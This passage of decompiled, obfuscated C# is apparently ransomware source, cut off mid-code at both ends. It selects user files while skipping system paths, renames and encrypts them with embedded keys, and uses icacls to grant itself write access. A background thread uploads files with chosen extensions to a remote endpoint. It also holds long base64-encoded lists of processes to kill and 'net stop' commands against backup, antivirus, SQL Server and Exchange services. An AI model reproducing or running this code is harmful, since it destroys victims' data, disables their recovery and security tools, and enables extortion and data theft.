						}
						catch
						{
						}
						xQfMOPCvvVAqwp(joRKfFeYni("aWNhY2xzLmV4ZQ=="), "\"" + item + "\"" + joRKfFeYni("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + joRKfFeYni("OkYgL1QgL0MgL1E="));
					}
				}
				catch (Exception ex2)
				{
					if (nOaztTOGmlogd)
					{
						try
						{
							File.AppendAllText(zRTqZqtXid, "File: " + item + " - Error while checking for user write access permission: " + ex2.Message + "\r\n");
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (nOaztTOGmlogd)
						{
							try
							{
								File.AppendAllText(zRTqZqtXid, "File: " + item + " - Error while reading if filesize is zero: " + ex2.Message + "\r\n");
							}
							catch (Exception)
							{
							}
						}
						ZmTUAzYynatCYr++;
						goto end_IL_052f;
					}
					byte[] bytes;
					if (VPAHoMRqycZH == "YES" && new FileInfo(item).Length > Convert.ToInt32(oIPxacaZFPrUD) * 1024 * 1024 && !CeGwqiGcZtQOavm.Contains(t1))
					{
						try
						{
							if (EffhycCZIlyfd != ".*")
							{
								if (FDgJvwVvfGwgSO)
								{
									EffhycCZIlyfd = pwDwUXHyIHVn + EffhycCZIlyfd;
								}
								File.Move(item, item + EffhycCZIlyfd);
							}
						}
						catch (Exception ex2)
						{
							if (nOaztTOGmlogd)
							{
								try
								{
									File.AppendAllText(zRTqZqtXid, "File: " + item + " - Error while renaming to crypted extension: " + ex2.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							ZmTUAzYynatCYr++;
							goto end_IL_052f;
						}
						dQotRvOnqv = "";
						if (EffhycCZIlyfd != ".*")
						{
							dQotRvOnqv = item + EffhycCZIlyfd;
						}
						else
						{
							dQotRvOnqv = item;
						}
						if (zZHWpuVxsPg == "YES")
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in CaWnKQHcaGrIr)
								{
									if (dQotRvOnqv.ToLower().EndsWith(item2 + EffhycCZIlyfd) && CxqzogRLMjBXRE == "YES")
									{
										if (Convert.ToInt32(ChPvsDcZDKEbb) * 1024 * 1024 > new FileInfo(dQotRvOnqv).Length)
										{
											try
											{
												tbTGHSHczYFiA.notwODHLHfYFV("URL", "USERNAME", "ACCESO", dQotRvOnqv);
											}
											catch
											{
											}
										}
									}
									else if (dQotRvOnqv.ToLower().EndsWith(item2) && CxqzogRLMjBXRE == "NO")
									{
										try
										{
											tbTGHSHczYFiA.notwODHLHfYFV("URL", "USERNAME", "ACCESO", dQotRvOnqv);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						bytes = Encoding.ASCII.GetBytes(EUefSwzLcwrcxo);
						if (HjepCHoOwiDqIr == "NO")
						{
							byte[] array2 = null;
							byte[] array3 = LPxPUxFbwbiz.IXQbjATPSfee(dQotRvOnqv, Convert.ToInt32(oIPxacaZFPrUD) * 1024 * 1024);
							if (LPxPUxFbwbiz.vNGqufskYtzV(qsGNXaukFrpn: (!BnBkXlAwDSWJ) ? (zzEQfIIuvgiBbM ? LPxPUxFbwbiz.DJqnxaACLqbwV(array3, Convert.FromBase64String(rtATyKSVirO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : LPxPUxFbwbiz.DJqnxaACLqbwV(array3, Convert.FromBase64String(rtATyKSVirO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (zzEQfIIuvgiBbM ? vrURVOQkkFzVFw.ZlRyaqmLMIOjEX(array3, Convert.FromBase64String(rtATyKSVirO), Convert.FromBase64String(zHvtZFBnnxDI)) : vrURVOQkkFzVFw.ZlRyaqmLMIOjEX(array3, Convert.FromBase64String(rtATyKSVirO), Convert.FromBase64String(zHvtZFBnnxDI))), RTZZWNJCGwYa: dQotRvOnqv, TCvcLhMGOtwKlg: bytes))
							{
								goto IL_0b8d;
							}
							try
							{
								File.Move(item + EffhycCZIlyfd, item);
							}
							catch (Exception)
							{
							}
						}
						else if (!zzEQfIIuvgiBbM)
						{
							if (edRtLMSZmnqkqI.eIzMNjltVFURhx(dQotRvOnqv, oIPxacaZFPrUD, rtATyKSVirO, null, Convert.FromBase64String(zHvtZFBnnxDI)))
							{
								goto IL_0b8d;
							}
							try
							{
								File.Move(item + EffhycCZIlyfd, item);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (edRtLMSZmnqkqI.eIzMNjltVFURhx(dQotRvOnqv, oIPxacaZFPrUD, rtATyKSVirO, bytes, Convert.FromBase64String(zHvtZFBnnxDI)))
							{
								goto IL_0b8d;
							}
							try
							{
								File.Move(item + EffhycCZIlyfd, item);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (FDgJvwVvfGwgSO)
					{
						EffhycCZIlyfd = pwDwUXHyIHVn + EffhycCZIlyfd;
					}
					bytes = Encoding.ASCII.GetBytes(EUefSwzLcwrcxo);
					if (EffhycCZIlyfd != ".*")
					{
						if (!ZpQytShExiATF)
						{
							if (!zzEQfIIuvgiBbM)
							{
								yVretiDPSk(item, item + EffhycCZIlyfd, SJplwSfijrqqcbsF);
							}
							else
							{
								yVretiDPSk(item, item + EffhycCZIlyfd, Convert.FromBase64String(rtATyKSVirO));
							}
						}
						else
						{
							try
							{
								if (!zzEQfIIuvgiBbM)
								{
									FmQycvGqoE(item, item + EffhycCZIlyfd, SJplwSfijrqqcbsF, Convert.FromBase64String(zHvtZFBnnxDI));
								}
								else
								{
									FmQycvGqoE(item, item + EffhycCZIlyfd, Convert.FromBase64String(rtATyKSVirO), Convert.FromBase64String(zHvtZFBnnxDI));
								}
							}
							catch (Exception ex2)
							{
								if (nOaztTOGmlogd)
								{
									try
									{
										File.AppendAllText(zRTqZqtXid, "File: " + item + " - Error while fully writing to file: " + ex2.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								ZmTUAzYynatCYr++;
								try
								{
									File.Move(item + EffhycCZIlyfd, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_052f;
							}
						}
					}
					else if (!ZpQytShExiATF)
					{
						if (!zzEQfIIuvgiBbM)
						{
							yVretiDPSk(item, item + ".part", SJplwSfijrqqcbsF);
						}
						else
						{
							yVretiDPSk(item, item + ".part", Convert.FromBase64String(rtATyKSVirO));
						}
					}
					else
					{
						try
						{
							if (!zzEQfIIuvgiBbM)
							{
								FmQycvGqoE(item, item, SJplwSfijrqqcbsF, Convert.FromBase64String(zHvtZFBnnxDI));
							}
							else
							{
								FmQycvGqoE(item, item, Convert.FromBase64String(rtATyKSVirO), Convert.FromBase64String(zHvtZFBnnxDI));
							}
						}
						catch (Exception ex2)
						{
							if (nOaztTOGmlogd)
							{
								try
								{
									File.AppendAllText(zRTqZqtXid, "File: " + item + " - Error while fully writing to file: " + ex2.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							ZmTUAzYynatCYr++;
							goto end_IL_052f;
						}
					}
					if (zzEQfIIuvgiBbM)
					{
						if (EffhycCZIlyfd != ".*")
						{
							iQdVnFhsXceS(item + EffhycCZIlyfd, bytes);
						}
						else
						{
							iQdVnFhsXceS(item, bytes);
						}
					}
					goto IL_0b8d;
					end_IL_052f:;
				}
				catch (Exception)
				{
					goto IL_0b8d;
				}
				continue;
				IL_0b8d:
				wJRlewgeJSybuONn.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__47(string fileInfo)
		{
			if (((!fileInfo.Contains("C:\\Program Files\\") && !fileInfo.Contains("C:\\Program Files (x86)\\") && !fileInfo.Contains(":\\Windows\\") && !fileInfo.ToLower().Contains("perflogs") && !fileInfo.ToLower().Contains("internet explorer") && !fileInfo.Contains(":\\ProgramData\\") && !fileInfo.Contains("\\AppData\\") && !fileInfo.ToLower().Contains("msocache") && !fileInfo.ToLower().Contains("system volume information") && !fileInfo.ToLower().Contains("boot") && !fileInfo.ToLower().Contains("tor browser") && !fileInfo.ToLower().Contains("mozilla") && !fileInfo.ToLower().Contains("google chrome") && !fileInfo.ToLower().Contains("application data")) || fileInfo.Contains(joRKfFeYni("TWljcm9zb2Z0IFNRTCBTZXJ2ZXI="))) && !fileInfo.Contains("autoexec.bat") && !fileInfo.Contains("desktop.ini") && !fileInfo.Contains("autorun.inf") && !fileInfo.Contains("ntuser.dat") && !fileInfo.Contains("NTUSER.DAT") && !fileInfo.Contains("iconcache.db") && !fileInfo.Contains("bootsect.bak") && !fileInfo.Contains("boot.ini") && !fileInfo.Contains("ntuser.dat.log") && !fileInfo.Contains("thumbs.db") && !fileInfo.ToLower().Contains("bootmgr") && !fileInfo.ToLower().Contains("pagefile.sys") && !fileInfo.ToLower().Contains("config.sys") && !fileInfo.ToLower().Contains("ntuser.ini") && !fileInfo.Contains(joRKfFeYni("QnVpbGRlcl9Mb2c=")) && !fileInfo.Contains("RSAKeys") && !fileInfo.Contains("ECCKeys") && !fileInfo.Contains("Config.enc") && !fileInfo.Contains("Инструкция") && !fileInfo.EndsWith(EffhycCZIlyfd) && !fileInfo.EndsWith("exe") && !fileInfo.EndsWith("dll") && !fileInfo.EndsWith("EXE") && !fileInfo.EndsWith("DLL") && !fileInfo.Contains("Recycle.Bin") && !fileInfo.Contains(vDqPFVseLDSEcY) && !fileInfo.Contains(zRTqZqtXid) && !fileInfo.Contains(mPCnRrJrfRICdG))
			{
				if (nmAkxakLDtEJM.Length != 0)
				{
					string[] array = nmAkxakLDtEJM;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!fileInfo.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0d86;
					}
				}
				try
				{
					if (fileInfo.EndsWith(EffhycCZIlyfd))
					{
						goto IL_0d86;
					}
				}
				catch (Exception)
				{
					goto IL_0d86;
				}
				if (!NnFouaTmgntTWt.Contains(fileInfo))
				{
					if (LitDbhWzmovijj == "YES")
					{
						try
						{
							if (fbDAqJbVdGX.muSdOUxGcrOy(fileInfo))
							{
								fbDAqJbVdGX.yDSXoshfrbq(fileInfo);
							}
						}
						catch
						{
						}
					}
					NnFouaTmgntTWt.Add(fileInfo);
					if (!jjfntRYhuFNxp.Contains(Path.GetDirectoryName(fileInfo)))
					{
						jjfntRYhuFNxp.Add(Path.GetDirectoryName(fileInfo));
					}
					SUdHgdcEVqPlo(fileInfo);
					try
					{
						new VYzGohYILkFyc().XUlcnnRhoSBk(fileInfo);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(fileInfo, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (aLMUqgosPdtj)
								{
									Console.WriteLine("Setting write access permission: " + fileInfo + " - File Size: " + new FileInfo(fileInfo).Length + " bytes");
									Console.WriteLine("----------------------------------------------------------------------------");
								}
							}
							catch
							{
							}
							xQfMOPCvvVAqwp(joRKfFeYni("aWNhY2xzLmV4ZQ=="), "\"" + fileInfo + "\"" + joRKfFeYni("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + joRKfFeYni("OkYgL1QgL0MgL1E="));
						}
					}
					catch (Exception ex2)
					{
						if (nOaztTOGmlogd)
						{
							try
							{
								File.AppendAllText(zRTqZqtXid, "File: " + fileInfo + " - Error while checking for user write access permission: " + ex2.Message + "\r\n");
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(fileInfo).Length != 0L)
							{
								goto end_IL_068b;
							}
							goto end_IL_068a;
							end_IL_068b:;
						}
						catch (Exception ex2)
						{
							if (nOaztTOGmlogd)
							{
								try
								{
									File.AppendAllText(zRTqZqtXid, "File: " + fileInfo + " - Error while reading if filesize is zero: " + ex2.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							ZmTUAzYynatCYr++;
							goto end_IL_068a;
						}
						if (VPAHoMRqycZH == "YES" && new FileInfo(fileInfo).Length > Convert.ToInt32(oIPxacaZFPrUD) * 1024 * 1024)
						{
							try
							{
								if (EffhycCZIlyfd != ".*")
								{
									if (FDgJvwVvfGwgSO)
									{
										EffhycCZIlyfd = pwDwUXHyIHVn + EffhycCZIlyfd;
									}
									File.Move(fileInfo, fileInfo + EffhycCZIlyfd);
								}
							}
							catch (Exception ex2)
							{
								if (nOaztTOGmlogd)
								{
									try
									{
										File.AppendAllText(zRTqZqtXid, "File: " + fileInfo + " - Error while renaming to crypted extension: " + ex2.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								ZmTUAzYynatCYr++;
								return;
							}
							if (EffhycCZIlyfd != ".*")
							{
								fileInfo += EffhycCZIlyfd;
							}
							if (zZHWpuVxsPg == "YES")
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item in CaWnKQHcaGrIr)
									{
										if (fileInfo.ToLower().EndsWith(item + EffhycCZIlyfd) && CxqzogRLMjBXRE == "YES")
										{
											if (Convert.ToInt32(ChPvsDcZDKEbb) * 1024 * 1024 > new FileInfo(fileInfo).Length)
											{
												try
												{
													tbTGHSHczYFiA.notwODHLHfYFV("URL", "USERNAME", "ACCESO", fileInfo);
												}
												catch
												{
												}
											}
										}
										else if (fileInfo.ToLower().EndsWith(item) && CxqzogRLMjBXRE == "NO")
										{
											try
											{
												tbTGHSHczYFiA.notwODHLHfYFV("URL", "USERNAME", "ACCESO", fileInfo);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							byte[] bytes = Encoding.ASCII.GetBytes(EUefSwzLcwrcxo);
							if (HjepCHoOwiDqIr == "NO")
							{
								byte[] array2 = null;
								byte[] array3 = LPxPUxFbwbiz.IXQbjATPSfee(fileInfo, Convert.ToInt32(oIPxacaZFPrUD) * 1024 * 1024);
								if (!LPxPUxFbwbiz.vNGqufskYtzV(qsGNXaukFrpn: (!BnBkXlAwDSWJ) ? (zzEQfIIuvgiBbM ? LPxPUxFbwbiz.DJqnxaACLqbwV(array3, Convert.FromBase64String(rtATyKSVirO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : LPxPUxFbwbiz.DJqnxaACLqbwV(array3, Convert.FromBase64String(rtATyKSVirO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (zzEQfIIuvgiBbM ? vrURVOQkkFzVFw.ZlRyaqmLMIOjEX(array3, Convert.FromBase64String(rtATyKSVirO), Convert.FromBase64String(zHvtZFBnnxDI)) : vrURVOQkkFzVFw.ZlRyaqmLMIOjEX(array3, Convert.FromBase64String(rtATyKSVirO), Convert.FromBase64String(zHvtZFBnnxDI))), RTZZWNJCGwYa: fileInfo, TCvcLhMGOtwKlg: bytes))
								{
									try
									{
										File.Move(fileInfo + EffhycCZIlyfd, fileInfo);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!zzEQfIIuvgiBbM)
							{
								if (!edRtLMSZmnqkqI.eIzMNjltVFURhx(fileInfo, oIPxacaZFPrUD, rtATyKSVirO, null, Convert.FromBase64String(zHvtZFBnnxDI)))
								{
									try
									{
										File.Move(fileInfo + EffhycCZIlyfd, fileInfo);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!edRtLMSZmnqkqI.eIzMNjltVFURhx(fileInfo, oIPxacaZFPrUD, rtATyKSVirO, bytes, Convert.FromBase64String(zHvtZFBnnxDI)))
							{
								try
								{
									File.Move(fileInfo + EffhycCZIlyfd, fileInfo);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (FDgJvwVvfGwgSO)
							{
								EffhycCZIlyfd = pwDwUXHyIHVn + EffhycCZIlyfd;
							}
							byte[] bytes = Encoding.ASCII.GetBytes(EUefSwzLcwrcxo);
							if (EffhycCZIlyfd != ".*")
							{
								if (!ZpQytShExiATF)
								{
									if (!zzEQfIIuvgiBbM)
									{
										yVretiDPSk(fileInfo, fileInfo + EffhycCZIlyfd, SJplwSfijrqqcbsF);
									}
									else
									{
										yVretiDPSk(fileInfo, fileInfo + EffhycCZIlyfd, Convert.FromBase64String(rtATyKSVirO));
									}
								}
								else
								{
									try
									{
										if (!zzEQfIIuvgiBbM)
										{
											FmQycvGqoE(fileInfo, fileInfo + EffhycCZIlyfd, SJplwSfijrqqcbsF, Convert.FromBase64String(zHvtZFBnnxDI));
										}
										else
										{
											FmQycvGqoE(fileInfo, fileInfo + EffhycCZIlyfd, Convert.FromBase64String(rtATyKSVirO), Convert.FromBase64String(zHvtZFBnnxDI));
										}
									}
									catch (Exception ex2)
									{
										if (nOaztTOGmlogd)
										{
											try
											{
												File.AppendAllText(zRTqZqtXid, "File: " + fileInfo + " - Error while fully writing to file: " + ex2.Message + "\r\n");
											}
											catch (Exception)
											{
											}
										}
										ZmTUAzYynatCYr++;
										try
										{
											File.Move(fileInfo + EffhycCZIlyfd, fileInfo);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!ZpQytShExiATF)
							{
								if (!zzEQfIIuvgiBbM)
								{
									yVretiDPSk(fileInfo, fileInfo + ".part", SJplwSfijrqqcbsF);
								}
								else
								{
									yVretiDPSk(fileInfo, fileInfo + ".part", Convert.FromBase64String(rtATyKSVirO));
								}
							}
							else
							{
								try
								{
									if (!zzEQfIIuvgiBbM)
									{
										FmQycvGqoE(fileInfo, fileInfo, SJplwSfijrqqcbsF, Convert.FromBase64String(zHvtZFBnnxDI));
									}
									else
									{
										FmQycvGqoE(fileInfo, fileInfo, Convert.FromBase64String(rtATyKSVirO), Convert.FromBase64String(zHvtZFBnnxDI));
									}
								}
								catch (Exception ex2)
								{
									if (nOaztTOGmlogd)
									{
										try
										{
											File.AppendAllText(zRTqZqtXid, "File: " + fileInfo + " - Error while fully writing to file: " + ex2.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
									ZmTUAzYynatCYr++;
									return;
								}
							}
							if (zzEQfIIuvgiBbM)
							{
								if (EffhycCZIlyfd != ".*")
								{
									iQdVnFhsXceS(fileInfo + EffhycCZIlyfd, bytes);
								}
								else
								{
									iQdVnFhsXceS(fileInfo, bytes);
								}
							}
						}
						end_IL_068a:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_0d86;
			IL_0d86:
			wJRlewgeJSybuONn.Remove(fileInfo);
		}
	}

	[CompilerGenerated]
	private sealed class vIwqsoucVfyMCU
	{
		public string ZalUDVijzgWPpB;

		public string bVsClBiANVVx;

		public void _003CEncrypt2_003Eb__55()
		{
			while (true)
			{
				try
				{
					File.Delete(ZalUDVijzgWPpB);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__56()
		{
			while (true)
			{
				try
				{
					if (File.Exists(bVsClBiANVVx))
					{
						File.Delete(bVsClBiANVVx);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	private const int EPJTaxkzyW = 134217728;

	private const int pewAATdfMZgFy = 4096;

	public static string ZXYptuaUWd = "EVET";

	public static string[] yyOElmgRHv;

	public static IEnumerable<DirectoryInfo> pZPOsLGinezboe;

	public static byte[] SJplwSfijrqqcbsF = null;

	public static DirectoryInfo qagLENFYqxIxvI;

	public static string qshYTVIXevhyaj = "NO";

	public static string YBwlHZzHGdGB = "100000000";

	public static List<string> vNjCRxJChaZG = new List<string>();

	public static List<string> vtTAHDXymbmxNuOQ = new List<string>();

	public static string BcZFdwiGYuZnFy = "NO";

	public static string rtATyKSVirO = "";

	public static string zHvtZFBnnxDI = "";

	public static string EUefSwzLcwrcxo = "";

	public static string UecIcCodEwnka = "NO";

	public static int GcTbUfgEunS = 0;

	public static string LitDbhWzmovijj = "YES";

	public static string SZPBdHRIlMJpRR = "NO";

	public static string cNBufbZlSmFXnD = "NO";

	public static string wMeaztRpjSaV = "0";

	public static string IfeNuNKvWgM = "NO";

	public static string SiqyVDzphxLty = "NO";

	public static string POZEZRBeRc = "YES";

	public static string lNYwPYmIsVcvica = "NO";

	public static List<string> PnQxSwddYDases = new List<string>
	{
		joRKfFeYni("bHNhc3MuZXhl"),
		joRKfFeYni("c3ZjaHN0LmV4ZQ=="),
		joRKfFeYni("Y3Jjc3MuZXhl"),
		joRKfFeYni("Y2hyb21lMzIuZXhl"),
		joRKfFeYni("ZmlyZWZveC5leGU="),
		joRKfFeYni("Y2FsYy5leGU="),
		joRKfFeYni("bXlzcWxkLmV4ZQ=="),
		joRKfFeYni("ZGxsaHN0LmV4ZQ=="),
		joRKfFeYni("b3BlcmEzMi5leGU="),
		joRKfFeYni("bWVtb3AuZXhl"),
		joRKfFeYni("c3Bvb2xjdi5leGU="),
		joRKfFeYni("Y3RmbW9tLmV4ZQ=="),
		joRKfFeYni("U2t5cGVBcHAuZXhl")
	};

	public static List<string> jjfntRYhuFNxp = new List<string>();

	public static string egnyhqecgWfvxd = "YES";

	public static string JMAzaRHPduh = "YES";

	public static string IVsEqCKXlS = "NO";

	public static List<string> NnFouaTmgntTWt = new List<string>();

	public static string FTansQggGPR = "NO";

	private static string dqWxFluIOh = "40133499-4a91-45a3-a419-f32bf51d37cc";

	public static string BHjDxJUUfXETE = "YES";

	public static string uqgaoFxkZOh = "NO";

	public static List<string> cxuPuyDRPwMSp = new List<string>
	{
		joRKfFeYni("c3RhcnQgRG5zY2FjaGUgL3k="),
		joRKfFeYni("c3RhcnQgRkRSZXNQdWIgL3k="),
		joRKfFeYni("c3RhcnQgU1NEUFNSViAveQ=="),
		joRKfFeYni("c3RhcnQgdXBucGhvc3QgL3k="),
		joRKfFeYni("c3RvcCBhdnBzdXMgL3k="),
		joRKfFeYni("c3RvcCBNY0FmZWVETFBBZ2VudFNlcnZpY2UgL3k="),
		joRKfFeYni("c3RvcCBtZmV3YyAveQ=="),
		joRKfFeYni("c3RvcCBCTVIgQm9vdCBTZXJ2aWNlIC95"),
		joRKfFeYni("c3RvcCBOZXRCYWNrdXAgQk1SIE1URlRQIFNlcnZpY2UgL3k="),
		joRKfFeYni("c3RvcCBEZWZXYXRjaCAveQ=="),
		joRKfFeYni("c3RvcCBjY0V2dE1nciAveQ=="),
		joRKfFeYni("c3RvcCBjY1NldE1nciAveQ=="),
		joRKfFeYni("c3RvcCBTYXZSb2FtIC95"),
		joRKfFeYni("c3RvcCBSVFZzY2FuIC95"),
		joRKfFeYni("c3RvcCBRQkZDU2VydmljZSAveQ=="),
		joRKfFeYni("c3RvcCBRQklEUFNlcnZpY2UgL3k="),
		joRKfFeYni("c3RvcCBJbnR1aXQuUXVpY2tCb29rcy5GQ1MgL3k="),
		joRKfFeYni("c3RvcCBRQkNGTW9uaXRvclNlcnZpY2UgL3k="),
		joRKfFeYni("c3RvcCBZb29CYWNrdXAgL3k="),
		joRKfFeYni("c3RvcCBZb29JVCAveQ=="),
		joRKfFeYni("c3RvcCB6aHVkb25nZmFuZ3l1IC95"),
		joRKfFeYni("c3RvcCBzdGNfcmF3X2FnZW50IC95"),
		joRKfFeYni("c3RvcCBWU05BUFZTUyAveQ=="),
		joRKfFeYni("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		joRKfFeYni("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		joRKfFeYni("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		joRKfFeYni("c3RvcCB2ZWVhbSAveQ=="),
		joRKfFeYni("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		joRKfFeYni("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		joRKfFeYni("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		joRKfFeYni("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		joRKfFeYni("c3RvcCBCYWNrdXBFeGVjRGl2ZWNpTWVkaWFTZXJ2aWNlIC95"),
		joRKfFeYni("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		joRKfFeYni("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		joRKfFeYni("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		joRKfFeYni("c3RvcCBBY3JTY2gyU3ZjIC95"),
		joRKfFeYni("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		joRKfFeYni("c3RvcCBDQVNBRDJEV2ViU3ZjIC95"),
		joRKfFeYni("c3RvcCBDQUFSQ1VwZGF0ZVN2YyAveQ=="),
		joRKfFeYni("c3RvcCBzb3Bob3MgL3k="),
		joRKfFeYni("c3RvcCDigJxBY3JvbmlzIFZTUyBQcm92aWRlcuKAnSAveQ=="),
		joRKfFeYni("c3RvcCBNc0R0c1NlcnZlciAveQ=="),
		joRKfFeYni("c3RvcCBJSVNBZG1pbiAveQ=="),
		joRKfFeYni("c3RvcCBNU0V4Y2hhbmdlRVMgL3k="),
		joRKfFeYni("c3RvcCDigJxTb3Bob3MgQWdlbnTigJ0gL3k="),
		joRKfFeYni("c3RvcCBFcmFzZXJTdmMxMTcxMCAveQ=="),
		joRKfFeYni("c3RvcCDigJxFbnRlcnByaXNlIENsaWVudCBTZXJ2aWNl4oCdIC95"),
		joRKfFeYni("c3RvcCDigJxTUUwgQmFja3VwcyAveQ=="),
		joRKfFeYni("c3RvcCBNc0R0c1NlcnZlcjEwMCAveQ=="),
		joRKfFeYni("c3RvcCBOZXRNc21xQWN0aXZhdG9yIC95"),
		joRKfFeYni("c3RvcCBNU0V4Y2hhbmdlSVMgL3k="),
		joRKfFeYni("c3RvcCDigJxTb3Bob3MgQXV0b1VwZGF0ZSBTZXJ2aWNl4oCdIC95"),
		joRKfFeYni("c3RvcCBTYW1TcyAveQ=="),
		joRKfFeYni("c3RvcCBSZXBvcnRTZXJ2ZXIgL3k="),
		joRKfFeYni("c3RvcCDigJxTUUxzYWZlIEJhY2t1cCBTZXJ2aWNl4oCdIC95"),
		joRKfFeYni("c3RvcCBNc0R0c1NlcnZlcjExMCAveQ=="),
		joRKfFeYni("c3RvcCBQT1AzU3ZjIC95"),
		joRKfFeYni("c3RvcCBNU0V4Y2hhbmdlTUdNVCAveQ=="),
		joRKfFeYni("c3RvcCDigJxTb3Bob3MgQ2xlYW4gU2VydmljZeKAnSAveQ=="),
		joRKfFeYni("c3RvcCBTTVRQU3ZjIC95"),
		joRKfFeYni("c3RvcCBSZXBvcnRTZXJ2ZXIkU1FMXzIwMDggL3k="),
		joRKfFeYni("c3RvcCDigJxTUUxzYWZlIEZpbHRlciBTZXJ2aWNl4oCdIC95"),
		joRKfFeYni("c3RvcCBtc2Z0ZXNxbCRQUk9EIC95"),
		joRKfFeYni("c3RvcCBTc3RwU3ZjIC95"),
		joRKfFeYni("c3RvcCBNU0V4Y2hhbmdlTVRBIC95"),
		joRKfFeYni("c3RvcCDigJxTb3Bob3MgRGV2aWNlIENvbnRyb2wgU2VydmljZeKAnSAveQ=="),
		joRKfFeYni("c3RvcCBSZXBvcnRTZXJ2ZXIkU1lTVEVNX0JHQyAveQ=="),
		joRKfFeYni("c3RvcCDigJxTeW1hbnRlYyBTeXN0ZW0gUmVjb3ZlcnnigJ0gL3k="),
		joRKfFeYni("c3RvcCBNU09MQVAkU1FMXzIwMDggL3k="),
		joRKfFeYni("c3RvcCBVSTBEZXRlY3QgL3k="),
		joRKfFeYni("c3RvcCBNU0V4Y2hhbmdlU0EgL3k="),
		joRKfFeYni("c3RvcCDigJxTb3Bob3MgRmlsZSBTY2FubmVyIFNlcnZpY2XigJ0gL3k="),
		joRKfFeYni("c3RvcCBSZXBvcnRTZXJ2ZXIkVFBTIC95"),
		joRKfFeYni("c3RvcCDigJxWZWVhbSBCYWNrdXAgQ2F0YWxvZyBEYXRhIFNlcnZpY2XigJ0gL3k="),
		joRKfFeYni("c3RvcCBNU09MQVAkU1lTVEVNX0JHQyAveQ=="),
		joRKfFeYni("c3RvcCBXM1N2YyAveQ=="),
		joRKfFeYni("c3RvcCBNU0V4Y2hhbmdlU1JTIC95"),
		joRKfFeYni("c3RvcCDigJxTb3Bob3MgSGVhbHRoIFNlcnZpY2XigJ0gL3k="),
		joRKfFeYni("c3RvcCBSZXBvcnRTZXJ2ZXIkVFBTQU1BIC95"),
		joRKfFeYni("c3RvcCDigJxab29seiAyIFNlcnZpY2XigJ0gL3k="),
		joRKfFeYni("c3RvcCBNU09MQVAkVFBTIC95"),
		joRKfFeYni("c3RvcCDigJxhcGhpZG1vbml0b3JzZXJ2aWNl4oCdIC95"),
		joRKfFeYni("c3RvcCBtc2V4Y2hhbmdlYWR0b3BvbG9neSAveQ=="),
		joRKfFeYni("c3RvcCDigJxTb3Bob3MgTUNTIEFnZW504oCdIC95"),
		joRKfFeYni("c3RvcCBBY3JTY2gyU3ZjIC95"),
		joRKfFeYni("c3RvcCBNU09MQVAkVFBTQU1BIC95"),
		joRKfFeYni("c3RvcCDigJxpbnRlbChyKSBwcm9zZXQgbW9uaXRvcmluZyBzZXJ2aWNl4oCdIC95"),
		joRKfFeYni("c3RvcCBtc2V4Y2hhbmdlaW1hcDQgL3k="),
		joRKfFeYni("c3RvcCDigJxTb3Bob3MgTUNTIENsaWVudOKAnSAveQ=="),
		joRKfFeYni("c3RvcCBBUlNNIC95"),
		joRKfFeYni("c3RvcCBNU1NRTCRCS1VQRVhFQyAveQ=="),
		joRKfFeYni("c3RvcCB1bmlzdG9yZXN2Y18xYWY0MGEgL3k="),
		joRKfFeYni("c3RvcCDigJxTb3Bob3MgTWVzc2FnZSBSb3V0ZXLigJ0gL3k="),
		joRKfFeYni("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
